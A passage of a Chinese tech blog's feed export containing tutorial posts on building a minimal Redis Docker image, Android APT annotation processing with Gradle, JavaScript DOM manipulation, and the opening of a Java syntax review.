</table></figure><ul>  <li>重启一个正在运行的容器</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sudo docker restart [OPTIONS] contains[CONTAINER]</span><br><span class="line">sudo docker restart 026e</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>停止一个已经停止的容器</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sudo docker start [OPTIONS] CONTAINER [CONTAINER..]</span><br><span class="line">sudo docker start 026e</span><br></pre>      </td>    </tr>  </table></figure><h1>制作镜像</h1><h2 id="ldd-打印共享依赖库">ldd: 打印共享依赖库</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line">ldd  redis-3.0.0/src/redis-server</span><br><span class="line">    linux-vdso.so.1 =&gt;  (0x00007fffde365000)</span><br><span class="line">    libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f307d5aa000)</span><br><span class="line">    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f307d38c000)</span><br><span class="line">    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f307cfc6000)</span><br><span class="line">    /lib64/ld-linux-x86-64.so.2 (0x00007f307d8b9000)</span><br></pre>      </td>    </tr>  </table></figure><h2 id="打包-so文件">打包<code>.so</code>文件</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">tar ztvf rootfs.tar.gz</span><br></pre>      </td>    </tr>  </table></figure><p>##制成Dockerfile</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">FROM scratch</span><br><span class="line">ADD  rootfs.tar.gz  /</span><br><span class="line">COPY redis.conf     /etc/redis/redis.conf</span><br><span class="line">EXPOSE 6379</span><br><span class="line">CMD [&quot;redis-server&quot;]</span><br></pre>      </td>    </tr>  </table></figure><h2 id="执行构建">执行构建</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">docker build -t redis .</span><br></pre>      </td>    </tr>  </table></figure><h2 id="测试">测试</h2><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">docker run -d --name redis redis</span><br><span class="line"></span><br><span class="line">redis-cli -h $(docker inspect -f &apos;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&apos; redis)</span><br><span class="line"></span><br><span class="line">redis-benchmark  -h $(docker inspect -f &apos;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&apos; redis-05)</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/ca4a993b/">http://home.meng.uno/articles/ca4a993b/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      本博文在观看网易蜂巢推出的玩转Docker镜像视频教程之后总结而成。

基本使用
谈到使用Docker，首先，我们必须要了解Dockerfile。（命名为Dockerfile，不要后缀）

Dockerfile的解读
首先引入一个例子：

1
2
3
4
5
6


FROM hub.c.163.com/bingohuang/debian:163
MAINTAINER bingohuang &lt;me@bingohuang.com&gt;
RUN apt-get update &amp;&amp; apt-get install -y nginx
COPY docker-mario /usr/share/nginx/w
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="Docker" scheme="http://home.meng.uno/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>APT相关</title>
    <link href="http://home.meng.uno/articles/63b8fab5/"/>
    <id>http://home.meng.uno/articles/63b8fab5/</id>
    <published>2017-03-07T06:32:53.000Z</published>
    <updated>2020-12-02T01:40:04.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>APT: 注解编译工具<code>Annotation Compile Tool</code>,用来在编译时根据注解自动生成Java代码。像<code>ButterKnife</code>,<code>EventBus</code>等库都为了避免因为反射带来的性能损失,都使用了APT注解方式。</p></blockquote><h1>使用APT需要的组件</h1><p>通常一个库有三个以下部分组成：</p><ul>  <li>核心包 用来对外提供使用,及库的逻辑部分</li>  <li>Anntation包 用来存放自定义的注解</li>  <li>Compiler包 这是APT运行所必需的,用来解释注解,告诉APT注解的意思及使用</li></ul><p>对与一个使用APT的库来说,Compiler包是必须的.Anntation包有时会包含在核心包里面。</p><h1>APT Pulgin</h1><p>虽然Java提供了APT,但在使用Gradle2.2之前的版本在编译时并不会调用APT,所以通过插件来调用。</p><p>这个插件也只能用Javac的方式进行编译。</p><p>从Gradle2.2开始,内置了APT的插件,不需要再进行声明,而且还支持以Jack的方式编译。</p><h1>APT的使用</h1><h2 id="2-2之前的版本">2.2之前的版本</h2><ol>  <li>在工程的Gradle中声明APT插件的依赖</li></ol><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">dependencies &#123;</span><br><span class="line">      classpath <span class="string">'com.android.tools.build:gradle:2.1.0'</span></span><br><span class="line">      classpath <span class="string">'com.neenbedankt.gradle.plugins:android-apt:1.8'</span></span><br><span class="line">  &#125;</span><br></pre>      </td>    </tr>  </table></figure><ol start="2">  <li>在Module的Gradle中声明使用APT插件</li></ol><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">apply plugin : `android-apt`</span><br></pre>      </td>    </tr>  </table></figure><ol start="3">  <li>在Module的依赖中添加库的依赖.核心包和Compiler包</li></ol><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">dependencies &#123;</span><br><span class="line">  <span class="function">compile <span class="title">fileTree</span><span class="params">(include: [<span class="string">'*.jar'</span>], dir: <span class="string">'libs'</span>)</span>       </span></span><br><span class="line"><span class="function">  compile 'com.jakewharton:butterknife:8.5.1'</span></span><br><span class="line"><span class="function">  apt 'com.jakewharton:butterknife-compiler:8.5.1'</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre>      </td>    </tr>  </table></figure><p>任何Module,只要需要使用APT,就必须在Gradle中声明使用APT插件及添加Compiler包的依赖。</p><h2 id="2-2之后的版本">2.2之后的版本</h2><ol>  <li>工程的Gradle中不需要声明APT插件,除非是库指定.</li></ol><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">dependencies &#123;</span><br><span class="line">      classpath <span class="string">'com.android.tools.build:gradle:2.3.0'</span></span><br><span class="line">      classpath <span class="string">'com.jakewharton:butterknife-gradle-plugin:8.5.1'</span></span><br><span class="line">  &#125;</span><br></pre>      </td>    </tr>  </table></figure><ol start="2">  <li>在项目的Gradle中不需要声明使用的插件,除非是库指定的.如果是个库,则依赖这个库的其它Module都不需要再声明</li></ol><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">apply plugin: <span class="string">'com.jakewharton.butterknife'</span></span><br></pre>      </td>    </tr>  </table></figure><ol start="3">  <li>在Module的Gradle中添加核心包及Compiler包的依赖.Compiler包不再使用APT命令,而是<code>annnotationProcessor</code></li></ol><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">dependencies &#123;</span><br><span class="line">    <span class="function">compile <span class="title">fileTree</span><span class="params">(include: [<span class="string">'*.jar'</span>], dir: <span class="string">'libs'</span>)</span></span></span><br><span class="line"><span class="function">    compile 'com.jakewharton:butterknife:8.5.1'</span></span><br><span class="line"><span class="function">    annotationProcessor 'com.jakewharton:butterknife-compiler:8.5.1'</span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre>      </td>    </tr>  </table></figure><p>任何Module,只需要使用APT,就必须在Gradle中添加Compiler包的依赖。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/63b8fab5/">http://home.meng.uno/articles/63b8fab5/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      APT: 注解编译工具Annotation Compile Tool,用来在编译时根据注解自动生成Java代码。像ButterKnife,EventBus等库都为了避免因为反射带来的性能损失,都使用了APT注解方式。

使用APT需要的组件
通常一个库有三个以下部分组成：

 * 核心包 用来对外提供使用,及库的逻辑部分
 * Anntation包 用来存放自定义的注解
 * Compiler包 这是APT运行所必需的,用来解释注解,告诉APT注解的意思及使用

对与一个使用APT的库来说,Compiler包是必须的.Anntation包有时会包含在核心包里面。

APT Pulgin
虽然J
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="Java" scheme="http://home.meng.uno/tags/Java/"/>
    
      <category term="Android" scheme="http://home.meng.uno/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript操作DOM</title>
    <link href="http://home.meng.uno/articles/2c47a986/"/>
    <id>http://home.meng.uno/articles/2c47a986/</id>
    <published>2017-03-05T08:03:01.000Z</published>
    <updated>2020-12-02T01:50:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="创建节点">创建节点</h2><p>除了可以使用<code>createElement</code>创建元素，也可以使用<code>createTextNode</code>创建文本节点。<code>document.body</code>指向的是<code>&lt;body&gt;</code>元素，<code>document.documentElement</code>则指向<code>&lt;html&gt;</code>元素。</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">//创建节点</span></span><br><span class="line">   <span class="keyword">var</span> createNode = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">   <span class="keyword">var</span> createTextNode = <span class="built_in">document</span>.createTextNode(<span class="string">"hello world"</span>);</span><br><span class="line">   createNode.appendChild(createTextNode);</span><br><span class="line">   <span class="built_in">document</span>.body.appendChild(createNode);</span><br><span class="line">   <span class="built_in">document</span>.documentElement.appendChild(createNode);</span><br></pre>      </td>    </tr>  </table></figure><h2 id="插入节点">插入节点</h2><p>可以使用appendChild，insertBefore，insertBefore接收两个参数，第一个是插入的节点，第二个是参照节点，如insertBefore(a,b)，则a会插入在b的前面</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">//插入节点</span></span><br><span class="line"> <span class="keyword">var</span> createNode = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line"><span class="keyword">var</span> createTextNode = <span class="built_in">document</span>.createTextNode(<span class="string">"hello world"</span>);</span><br><span class="line">createNode.appendChild(createTextNode);</span><br><span class="line"><span class="keyword">var</span> div1 = <span class="built_in">document</span>.getElementById(<span class="string">"div1"</span>);</span><br><span class="line"><span class="built_in">document</span>.body.insertBefore(createNode,div1);</span><br></pre>      </td>    </tr>  </table></figure><h2 id="替换和删除元素">替换和删除元素</h2><p>从replaceChild和removeChild的字面意思看，就是删除子节点，因此调用者，需要包含子节点div1，不然调用会报错。返回的节点是替换的或删除的元素，被替换/删除的元素仍然存在，但document中已经没有他们的位置了。</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">//替换元素</span></span><br><span class="line">   <span class="keyword">var</span> replaceChild = <span class="built_in">document</span>.body.replaceChild(createNode,div1);</span><br><span class="line"><span class="comment">//删除元素</span></span><br><span class="line">    <span class="keyword">var</span> removeChild = <span class="built_in">document</span>.body.removeChild(div1);</span><br></pre>      </td>    </tr>  </table></figure><h2 id="节点的属性">节点的属性</h2><ul>  <li>firstChild:第一个子节点</li>  <li>lastChild:最后一个子节点</li>  <li>childNodes:子节点集合，获取其中子节点可</li>  <li>someNode.childNodes[index]或</li>  <li>someNode.childNodes.item(index)</li>  <li>nextSibling:下一个兄弟节点</li>  <li>previousSibling：上一个兄弟节点</li>  <li>parentNode：父节点</li></ul><figure class="highlight vbscript-html">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"ul"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>sdsssssss<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>qqqq<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>wwww<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>eeee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br></pre>      </td>    </tr>  </table></figure><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">//节点属性</span></span><br><span class="line">  <span class="keyword">var</span> ul = <span class="built_in">document</span>.getElementById(<span class="string">"ul"</span>);</span><br><span class="line">  <span class="keyword">var</span> firstChild = ul.firstChild;</span><br><span class="line">  <span class="built_in">console</span>.log(firstChild.innerHTML);</span><br><span class="line">  <span class="keyword">var</span> lastChild = ul.lastChild;</span><br><span class="line">  <span class="built_in">console</span>.log(lastChild.innerHTML);</span><br><span class="line">  <span class="keyword">var</span> length = ul.childNodes.length;</span><br><span class="line">  <span class="built_in">console</span>.log(length);</span><br><span class="line">  <span class="keyword">var</span> secondChild = ul.childNodes.item(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(secondChild.innerHTML);</span><br><span class="line">  <span class="keyword">var</span> forthChild = ul.childNodes.item(<span class="number">2</span>).nextSibling;</span><br><span class="line">  <span class="built_in">console</span>.log(forthChild.innerHTML);</span><br><span class="line">  <span class="keyword">var</span> thridChild = forthChild.previousSibling;</span><br><span class="line">  <span class="built_in">console</span>.log(thridChild.innerHTML);</span><br><span class="line">  <span class="keyword">var</span> parentNode = forthChild.parentNode;</span><br><span class="line">  <span class="built_in">console</span>.log(parentNode.innerHTML);</span><br></pre>      </td>    </tr>  </table></figure><h2 id="文档片段">文档片段</h2><p>好处在于减少dom的渲染次数，可以优化性能。</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">//文本片段</span></span><br><span class="line">   <span class="keyword">var</span> fragment = <span class="built_in">document</span>.createDocumentFragment();</span><br><span class="line">   <span class="keyword">var</span> ul = <span class="built_in">document</span>.getElementById(<span class="string">"ul"</span>);</span><br><span class="line">   <span class="keyword">var</span> li = <span class="literal">null</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">4</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">       li = <span class="built_in">document</span>.createElement(<span class="string">"li"</span>);</span><br><span class="line">       li.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">"item "</span>+i));</span><br><span class="line">       fragment.appendChild(li);</span><br><span class="line">   &#125;</span><br><span class="line">   ul.appendChild(fragment);</span><br></pre>      </td>    </tr>  </table></figure><h2 id="克隆元素">克隆元素</h2><ul>  <li>someNode.cloneNode(true):深度克隆，会复制节点及整个子节点</li>  <li>someNode.cloneNode(false):浅克隆，会复制节点，但不复制子节点</li></ul><figure class="highlight php">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="comment">//克隆</span></span><br><span class="line"><span class="keyword">var</span> <span class="keyword">clone</span> = ul.cloneNode(<span class="keyword">true</span>);</span><br><span class="line">document.body.appendChild(<span class="keyword">clone</span>);</span><br></pre>      </td>    </tr>  </table></figure><h2 id="注意：">注意：</h2><h3 id="childnodes-length存在跨浏览器的问题">childNodes.length存在跨浏览器的问题</h3><p>可以看到有关列表的html片段没有用</p><figure class="highlight vbscript-html">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"ul"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>sdsssssss<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>qqqq<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>wwww<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span>&gt;</span>eeee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br></pre>      </td>    </tr>  </table></figure><p>这种书写格式而是使用没有换行的格式书写，是因为在不同的浏览器中，获取<code>ul.childNodes.length</code>的结果有差异：</p><ul>  <li>在ie中，ul.childNodes.length不会计算li之间的换行空格，从而得到数值为4</li>  <li>在ff、chrome,safari中，会有包含li之间的空白符的5个文本节点，因此ul.childNodes.length为9 若要解决跨浏览器问题，可以将li之间的换行去掉，改成一行书写格式。  </li></ul><h3 id="clonenode存在跨浏览器的问题">cloneNode存在跨浏览器的问题</h3><ul>  <li>在IE中，通过cloneNode方法复制的元素，会复制事件处理程序，比如，var b = a.cloneNode(true).若a存在click,mouseover等事件监听，则b也会拥有这些事件监听。</li>  <li>在ff,chrome,safari中，通过cloneNode方法复制的元素，只会复制特性，其他一切都不会复制 因此，若要解决跨浏览器问题，在复制前，最好先移除事件处理程序。  </li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/2c47a986/">http://home.meng.uno/articles/2c47a986/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      创建节点
除了可以使用createElement创建元素，也可以使用createTextNode创建文本节点。document.body指向的是&lt;body&gt;元素，document.documentElement则指向&lt;html&gt;元素。

1
2
3
4
5
6


//创建节点
   var createNode = document.createElement(&quot;div&quot;);
   var createTextNode = document.createTextNode(&quot;hello world&quot;);
   createNode.appendChild(createTextNode);
  
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="前端" scheme="http://home.meng.uno/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="DOM" scheme="http://home.meng.uno/tags/DOM/"/>
    
  </entry>
  
  <entry>
    <title>Java语法回顾</title>
    <link href="http://home.meng.uno/articles/50525a4c/"/>
    <id>http://home.meng.uno/articles/50525a4c/</id>
    <published>2017-03-04T13:11:06.000Z</published>
    <updated>2020-12-02T01:50:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1>注释</h1><p>每种语言，第一个教我们的都是“注释”。Java基本有如下三种注释。</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">// 单行注释</span><br></pre>      </td>    </tr>  </table></figure><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/*</span><br><span class="line">多行注释</span><br><span class="line">*/</span><br></pre>      </td>    </tr>  </table></figure><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line">JavaDoc（Java文档）注释是这样的。可以用来描述类和类的属性。</span><br><span class="line">*/</span><br></pre>      </td>    </tr>  </table></figure><h1>文件头</h1><h2 id="包">包</h2><p>包就像定义文件路径一样，实际上的存储也是按包的名称存储。</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">package</span> uno.meng;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="导入类">导入类</h2><p>导入一个类：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br></pre>      </td>    </tr>  </table></figure><p>导入所有类：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> java.security.*;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="书写类">书写类</h2><p>每个 <code>.java</code> 文件都包含一个public类，这个类的名字必须和这个文件名一致。</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LearnJava</span> </span>&#123;</span><br></pre>      </td>    </tr>  </table></figure><p>每个程序都需要有一个main函数作为入口：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span> </span>&#123;</span><br></pre>      </td>    </tr>  </table></figure><p>标准输出：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">System.out.println(<span class="string">"Hello World!"</span>);</span><br></pre>      </td>    </tr>  </table></figure><p>使用<code>+</code>来拼接字符串：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">System.out.println(</span><br><span class="line">    <span class="string">"Integer: "</span> + <span class="number">10</span> +</span><br><span class="line">    <span class="string">" Double: "</span> + <span class="number">3.14</span> +</span><br><span class="line">    <span class="string">" Boolean: "</span> + <span class="keyword">true</span>);</span><br></pre>      </td>    </tr>  </table></figure><p>如果要在输出后不想自动换行，可以使用System.out.print方法：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">System.out.print(<span class="string">"Hello "</span>);</span><br><span class="line">System.out.print(<span class="string">"World"</span>);</span><br></pre>      </td>    </tr>  </table></figure><h1>类型与变量</h1><h2 id="基本类型定义">基本类型定义</h2><p>用  <type>    <name> 来声明变量：</name></type></p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>      </td>      <td class="code">        <pre><span class="line">      <span class="keyword">byte</span> fooByte = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">short</span> fooShort = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">int</span> fooInt = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">long</span> fooLong = <span class="number">100000L</span>; <span class="comment">// L可以用来表示一个数字是长整型的。</span></span><br><span class="line"><span class="keyword">float</span> fooFloat = <span class="number">234.5f</span>; <span class="comment">// f用来表示一个数字是浮点型的。</span></span><br><span class="line"><span class="keyword">double</span> fooDouble = <span class="number">123.4</span>;</span><br><span class="line"><span class="keyword">boolean</span> fooBoolean = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">char</span> fooChar = <span class="string">'A'</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">int</span> HOURS_I_WORK_PER_WEEK = <span class="number">9001</span>; <span class="comment">// final 标识常量。</span></span><br><span class="line">String fooString = <span class="string">"My String Is Here!"</span>;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="数组">数组</h2><p>数组在声明时大小必须已经确定</p><p>数组的声明格式:</p><p>&lt;数据类型&gt; [] &lt;变量名&gt; = new &lt;数据类型&gt;[&lt;数组大小&gt;];</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">int</span> [] intArray = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">String [] stringArray = <span class="keyword">new</span> String[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">boolean</span> [] booleanArray = <span class="keyword">new</span> <span class="keyword">boolean</span>[<span class="number">100</span>];</span><br></pre>      </td>    </tr>  </table></figure><p>声明并初始化数组也可以这样:</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">int</span> [] y = &#123;<span class="number">9000</span>, <span class="number">1000</span>, <span class="number">1337</span>&#125;;</span><br></pre>      </td>    </tr>  </table></figure><p>随机访问数组中的元素:</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">System.out.println(<span class="string">"intArray @ 0: "</span> + intArray[<span class="number">0</span>]);</span><br></pre>      </td>    </tr>  </table></figure><p>数组下标从0开始并且可以被更改:</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">intArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">System.out.println(<span class="string">"intArray @ 1: "</span> + intArray[<span class="number">1</span>]); <span class="comment">// =&gt; 1</span></span><br></pre>      </td>    </tr>  </table></figure><h2 id="其他数据类型">其他数据类型</h2><p>ArrayLists - 类似于数组，但是功能更多，并且大小也可以改变，主要有：</p><ul>  <li>LinkedLists</li>  <li>Maps</li>  <li>HashMaps</li></ul><h1>操作符</h1><h2 id="多重申明">多重申明</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">int</span> i1 = <span class="number">1</span>, i2 = <span class="number">2</span>; <span class="comment">// 多重声明可以简化</span></span><br></pre>      </td>    </tr>  </table></figure><h2 id="算数运算">算数运算</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">System.out.println(<span class="string">"1+2 = "</span> + (i1 + i2)); <span class="comment">// =&gt; 3</span></span><br><span class="line">System.out.println(<span class="string">"2-1 = "</span> + (i2 - i1)); <span class="comment">// =&gt; 1</span></span><br><span class="line">System.out.println(<span class="string">"2*1 = "</span> + (i2 * i1)); <span class="comment">// =&gt; 2</span></span><br><span class="line">System.out.println(<span class="string">"1/2 = "</span> + (i1 / i2)); <span class="comment">// =&gt; 0 (0.5 truncated down)</span></span><br></pre>      </td>    </tr>  </table></figure><h2 id="取余">取余</h2><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">System.out.println(<span class="string">"11%3 = "</span>+(<span class="number">11</span> % <span class="number">3</span>)); <span class="comment">// =&gt; 2</span></span><br></pre>      </td>    </tr>  </table></figure><h2 id="比较操作符">比较操作符</h2><figure class="highlight 